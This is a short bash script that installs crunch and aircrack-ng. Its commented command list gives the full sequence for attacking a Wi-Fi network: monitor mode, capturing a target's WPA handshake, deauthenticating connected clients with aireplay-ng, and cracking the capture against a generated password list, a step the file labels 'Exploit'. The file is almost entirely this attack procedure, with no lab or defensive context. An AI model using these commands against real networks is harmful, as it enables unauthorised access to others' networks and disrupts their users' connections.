#!/usr/bin/env bash
sudo apt install crunch --yes
sudo apt install aircrack-ng --yes


#TODO
# sudo iwconfig 													| Shows the network card name
# sudo airmon-ng check kill												| Stop current processes that are using WIFI interface 
# sudo airmon-ng start {{Network Card Name}}   										| Start the network card in Monitor Mode
# sudo iwconfig 													| Shows the Network Card Name **It changed after last step
# sudo airodump-ng {{Network Card Name}}										| View all the WIFI networks arround
# sudo airodump-ng -c {{Target Network Channel}} --bssid {{Target Network BSSID}} -w /root {{Network Card Name}}  	| View the clients connected to the target network **Wait until it shows the "Hand Shanke"
# sudo aireplay-ng -0 10 -a {{Target Network BSSID}} {{Network Card Name}}  						| On a new terminal:  Disconnect the clients connected to the target network
# sudo aircrack-ng -a2 -b {{Target Network BSSID}} -w pwd.txt {{ .cap file }}  						| Exploit

#   PASSWORD GENERATOR 
# sudo gcc pgen.c 													| Execute the Random Password Generator
# sudo ./a.out >> pwd.txt												| write the output of the Password Generator on the pwd.txt file 

